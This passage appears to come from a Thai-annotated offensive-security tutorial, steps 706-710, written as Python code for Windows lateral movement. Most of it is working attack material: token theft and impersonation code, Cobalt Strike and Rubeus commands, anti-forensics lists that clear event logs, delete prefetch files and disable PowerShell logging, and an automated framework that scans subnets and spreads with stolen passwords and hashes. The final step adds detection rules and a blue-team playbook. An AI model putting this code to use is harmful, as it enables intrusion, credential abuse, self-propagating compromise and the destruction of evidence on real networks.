    if not h_process:
        raise ctypes.WinError()
    
    # Open process token
    h_token = wintypes.HANDLE()
    if not advapi32.OpenProcessToken(
        h_process,
        TOKEN_DUPLICATE | TOKEN_QUERY,
        ctypes.byref(h_token)
    ):
        kernel32.CloseHandle(h_process)
        raise ctypes.WinError()
    
    # Duplicate token
    h_dup_token = wintypes.HANDLE()
    if not advapi32.DuplicateTokenEx(
        h_token,
        TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
        None,
        SECURITY_IMPERSONATION_LEVEL,
        TOKEN_TYPE_IMPERSONATION,
        ctypes.byref(h_dup_token)
    ):
        kernel32.CloseHandle(h_token)
        kernel32.CloseHandle(h_process)
        raise ctypes.WinError()
    
    kernel32.CloseHandle(h_token)
    kernel32.CloseHandle(h_process)
    return h_dup_token

def impersonate_user(pid: int):
    """Impersonate user by stealing token"""
    h_token = steal_token(pid)
    
    if advapi32.ImpersonateLoggedOnUser(h_token):
        print(f"[+] Successfully impersonating PID {pid}")
        return True
    
    kernel32.CloseHandle(h_token)
    return False
"""
    
    def generate_make_token_command(self, username: str, 
                                     domain: str, password: str) -> str:
        """Generate make_token command for Cobalt Strike"""
        return f"make_token {domain}\\{username} {password}"
    
    def print_token_commands_reference(self) -> str:
        """Print token manipulation reference"""
        return """
Token Manipulation Techniques:

[Meterpreter/Cobalt Strike]
  getsystem         - Attempt privilege escalation
  getuid            - Get current user
  steal_token <pid> - Steal token from process
  impersonate_token "DOMAIN\\user" - Impersonate user
  make_token DOMAIN\\user pass - Create new logon session
  rev2self          - Revert to original token

[Command Line]
  runas /user:DOMAIN\\user cmd.exe
  runas /netonly /user:DOMAIN\\user cmd.exe  # Network creds only

[Rubeus]
  Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe
  Rubeus.exe asktgt /user:admin /password:pass
"""
```

## Step 708: Defense Evasion During Lateral Movement

```python
from dataclasses import dataclass
from typing import List, Dict


class DefenseEvasionLateralMovement:
    """Defense evasion ระหว่าง lateral movement"""
    
    def generate_stealth_techniques(self) -> Dict[str, List[str]]:
        """เทคนิค stealth สำหรับ lateral movement"""
        return {
            'network_noise_reduction': [
                'Use SMB over existing connections to avoid new network connections',
                'Prefer WMI over PsExec (less noisy on network)',
                'Use existing administrative shares (ADMIN$, IPC$)',
                'Avoid scanning - use AD for target discovery instead'
            ],
            'log_evasion': [
                'Use WMI instead of cmd.exe (no process creation event)',
                'Use PowerShell without ScriptBlock logging (if not enabled)',
                'Clear Windows event logs after pivoting: wevtutil cl Security',
                'Delete created files and services after use'
            ],
            'process_hiding': [
                'Inject into existing svchost.exe or explorer.exe',
                'Use process hollowing with legitimate binary',
                'Migrate to process with less monitoring',
                'Use PPID spoofing to hide parent process'
            ],
            'timing_evasion': [
                'Operate during business hours to blend with normal traffic',
                'Add randomized sleep between operations',
                'Match movement patterns to normal admin activity',
                'Use legitimate admin tools (PsExec-like access patterns exist)'
            ]
        }
    
    def generate_service_cleanup(self, service_name: str = 'BTOBTO') -> List[str]:
        """ลบ service ที่สร้างไว้"""
        return [
            f'sc.exe \\\\target stop {service_name}',
            f'sc.exe \\\\target delete {service_name}',
            f'wevtutil cl System',
            f'wevtutil cl Security'
        ]
    
    def anti_forensics_commands(self) -> List[str]:
        """Anti-forensics commands"""
        return [
            '# Clear event logs',
            'wevtutil cl Application',
            'wevtutil cl Security',
            'wevtutil cl System',
            '',
            '# Delete prefetch files',
            'del /q /f C:\\Windows\\Prefetch\\*.pf',
            '',
            '# Clear MFT timestamps (requires admin)',
            'timestomp.exe <file> -m <timestamp>',
            '',
            '# Disable PowerShell logging',
            'Set-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging -Name "EnableScriptBlockLogging" -Value 0',
        ]
```

## Step 709: Automated Lateral Movement Framework

```python
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Set
import time
import ipaddress


@dataclass
class TargetHost:
    ip: str
    hostname: str = ''
    os: str = ''
    open_ports: List[int] = field(default_factory=list)
    compromised: bool = False
    credentials: List[Dict] = field(default_factory=list)
    pivoted_from: str = ''


class AutomatedLateralMovement:
    """เครื่องมือ automated lateral movement"""
    
    def __init__(self):
        self.targets: Dict[str, TargetHost] = {}
        self.credentials: List[Dict] = []
        self.compromised_hosts: Set[str] = set()
        
    def discover_internal_hosts(self, subnet: str, 
                                  method: str = 'arp') -> List[TargetHost]:
        """ค้นหา hosts ในเครือข่ายภายใน"""
        import subprocess
        hosts = []
        
        network = ipaddress.IPv4Network(subnet, strict=False)
        
        if method == 'arp':
            # ARP scan
            result = subprocess.run(
                ['arp-scan', '-l', '--interface', 'eth0'],
                capture_output=True, text=True
            )
            for line in result.stdout.split('\n'):
                parts = line.split()
                if len(parts) >= 2 and parts[0].count('.') == 3:
                    try:
                        ip = ipaddress.IPv4Address(parts[0])
                        if ip in network:
                            hosts.append(TargetHost(ip=str(ip)))
                    except Exception:
                        pass
        
        elif method == 'nmap':
            result = subprocess.run(
                ['nmap', '-sn', subnet, '-oG', '-'],
                capture_output=True, text=True
            )
            for line in result.stdout.split('\n'):
                if 'Up' in line:
                    import re
                    ip_match = re.search(r'Host: ([\d.]+)', line)
                    if ip_match:
                        hosts.append(TargetHost(ip=ip_match.group(1)))
        
        for host in hosts:
            self.targets[host.ip] = host
        
        return hosts
    
    def try_credentials(self, target: TargetHost, 
                         credentials: List[Dict]) -> Optional[Dict]:
        """ทดสอบ credentials บน target"""
        smb_lateral = SMBLateralMovement()
        
        for cred in credentials:
            username = cred.get('username', '')
            domain = cred.get('domain', '.')
            password = cred.get('password', '')
            nt_hash = cred.get('nt_hash', '')
            
            try:
                if nt_hash:
                    output = smb_lateral._try_pth(target.ip, username, domain, nt_hash)
                elif password:
                    output = smb_lateral.execute_via_wmiexec(
                        target.ip, username, password, domain, 'whoami'
                    )
                else:
                    continue
                
                if username.lower() in output.lower() or 'authority' in output.lower():
                    print(f"[+] Pwned {target.ip} with {domain}\\{username}")
                    return cred
                    
            except Exception:
                pass
        
        return None
    
    def propagate(self, initial_host: str, credentials: List[Dict],
                   subnet: str, max_hops: int = 3) -> Dict:
        """Automated network propagation"""
        print(f"[*] Starting propagation from {initial_host}")
        
        self.compromised_hosts.add(initial_host)
        self.credentials = credentials
        
        propagation_tree = {
            initial_host: {
                'compromised_at': time.time(),
                'method': 'initial_access',
                'children': []
            }
        }
        
        current_hop = [initial_host]
        
        for hop in range(max_hops):
            print(f"\n[*] Hop {hop + 1}/{max_hops}")
            next_hop = []
            
            for pivot_host in current_hop:
                # Discover hosts from pivot
                new_hosts = self.discover_internal_hosts(subnet)
                uncompromised = [
                    h for h in new_hosts
                    if h.ip not in self.compromised_hosts
                ]
                
                for target in uncompromised:
                    working_cred = self.try_credentials(target, credentials)
                    
                    if working_cred:
                        self.compromised_hosts.add(target.ip)
                        target.compromised = True
                        target.pivoted_from = pivot_host
                        
                        propagation_tree[target.ip] = {
                            'compromised_at': time.time(),
                            'method': 'lateral_movement',
                            'from': pivot_host,
                            'credential': working_cred['username'],
                            'children': []
                        }
                        
                        next_hop.append(target.ip)
                        
                        # Dump credentials from new host
                        # และเพิ่ม credentials ใหม่
            
            current_hop = next_hop
            if not next_hop:
                print(f"[*] No new hosts compromised at hop {hop + 1}")
                break
        
        return {
            'total_compromised': len(self.compromised_hosts),
            'propagation_tree': propagation_tree
        }
```

## Step 710: Lateral Movement Detection and Defense

```python
from dataclasses import dataclass, field
from typing import List, Dict, Optional
import json


class LateralMovementDetector:
    """ตรวจจับ lateral movement (Blue Team perspective)"""
    
    CRITICAL_EVENT_IDS = {
        4624: 'Logon Success',
        4625: 'Logon Failure',
        4648: 'Logon with Explicit Credentials',
        4768: 'Kerberos TGT Request',
        4769: 'Kerberos Service Ticket Request',
        4776: 'DC Authentication Attempt',
        7045: 'New Service Installed',
        4697: 'Service Installed',
        4698: 'Scheduled Task Created',
        4702: 'Scheduled Task Updated'
    }
    
    LATERAL_MOVEMENT_PATTERNS = [
        {
            'name': 'Pass-the-Hash',
            'indicators': [
                'Event 4624 Type 3 (Network) with NTLM auth',
                'Event 4776 from non-DC machines',
                'Multiple logons from same NTLM hash across hosts'
            ],
            'sigma_rule': '''
title: Pass-the-Hash Detection
detection:
  selection:
    EventID: 4624
    LogonType: 3
    AuthenticationPackageName: NTLM
    WorkstationName|not_endswith: '$'
  condition: selection
level: medium
'''
        },
        {
            'name': 'Kerberoasting',
            'indicators': [
                'Event 4769 with RC4 encryption (type 0x17)',
                'Multiple TGS requests for service tickets'
            ],
            'sigma_rule': '''
title: Kerberoasting Activity
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: '0x17'
    Status: '0x0'
    ServiceName|not_endswith: '$'
  condition: selection | count() by SubjectUserName > 5
level: high
'''
        },
        {
            'name': 'PsExec Lateral Movement',
            'indicators': [
                'Service PSEXESVC created (Event 7045)',
                'File dropped to ADMIN$ share',
                'Event 4697 with random service name'
            ],
            'sigma_rule': '''
title: PsExec Tool Execution
detection:
  selection:
    EventID: 7045
    ServiceName: PSEXESVC
  condition: selection
level: high
'''
        },
        {
            'name': 'WMI Lateral Movement',
            'indicators': [
                'WmiPrvSE.exe spawning processes',
                'Event 4688 with parent wbemcons.dll',
                'Multiple remote WMI calls'
            ],
            'sigma_rule': '''
title: WMI Lateral Movement
detection:
  selection:
    EventID: 4688
    ParentProcessName|endswith: '\\wbemcons.dll'
  condition: selection
level: high
'''
        }
    ]
    
    def analyze_logon_events(self, events: List[Dict]) -> List[Dict]:
        """วิเคราะห์ logon events"""
        alerts = []

        # Group by source IP
        logons_by_ip = {}
        for event in events:
            if event.get('EventID') == 4624:
                src_ip = event.get('IpAddress', '')
                if src_ip:
                    if src_ip not in logons_by_ip:
                        logons_by_ip[src_ip] = []
                    logons_by_ip[src_ip].append(event)
        
        # ตรวจหา horizontal movement (same IP, many targets)
        for src_ip, events_list in logons_by_ip.items():
            targets = set(e.get('TargetServerName', '') for e in events_list)
            if len(targets) > 5:  # Logged into 5+ different systems
                alerts.append({
                    'type': 'Horizontal Movement',
                    'severity': 'high',
                    'source_ip': src_ip,
                    'targets_count': len(targets),
                    'description': f'IP {src_ip} logged into {len(targets)} different systems'
                })
        
        return alerts
    
    def generate_detection_playbook(self) -> str:
        """Generate lateral movement detection playbook"""
        return """
# Lateral Movement Detection Playbook

## Investigation Steps

### 1. Identify Suspicious Logons
```splunk
# Logon Type 3 (Network) from workstations
EventID=4624 LogonType=3 
| stats count by src_ip, dest_host, user
| where count > 10
| sort -count
```

### 2. Find Pass-the-Hash
```splunk
# NTLM auth from non-DCs
EventID=4776 
| where NOT (src_ip IN dc_ips)
| stats count by src_ip, user
| sort -count
```

### 3. Detect PsExec
```splunk
EventID=7045 ServiceName=PSEXESVC
| join EventID=4624 by src_ip
| table _time, src_ip, dest_host, ServiceName, user
```

### 4. Kerberoasting Detection
```splunk
EventID=4769 TicketEncryptionType=0x17
| stats count by user, ServiceName
| where count > 5
| sort -count
```

## Response Actions
1. Isolate compromised hosts from network
2. Reset credentials for affected accounts
3. Review Kerberos ticket lifetimes
4. Enable Credential Guard on Windows 10+
5. Block NTLM where possible (use Kerberos)
6. Review admin shares and disable if not needed
"""


if __name__ == '__main__':
    # Demo lateral movement framework
    
    # Credential attacks
    cred_attacks = CredentialAttacks()
    
    # SMB lateral movement
    smb = SMBLateralMovement()
    shares = smb.enumerate_smb_shares(
        '192.168.1.10', 'admin', 'Password1', 'CORP'
    )
    print(f"SMB shares: {shares}")
    
    # AD enumeration
    ad = ActiveDirectoryLateralMovement()
    
    # Network pivoting
    pivoting = NetworkPivoting()
    proxychains_conf = pivoting.proxychains_config()
    print(f"Proxychains config:\n{proxychains_conf}")
    
    # LOLBins
    lolbins = LivingOffTheLand()
    ps_cmd = lolbins.get_lolbin_command(
        'windows', 'powershell', 'bypass',
        command='whoami'
    )
    print(f"PowerShell LOLBin: {ps_cmd}")
    
    # Detector
    detector = LateralMovementDetector()
    print(f"\nLateral Movement Patterns ({len(detector.LATERAL_MOVEMENT_PATTERNS)})")
    for pattern in detector.LATERAL_MOVEMENT_PATTERNS:
        print(f"  - {pattern['name']}")
```
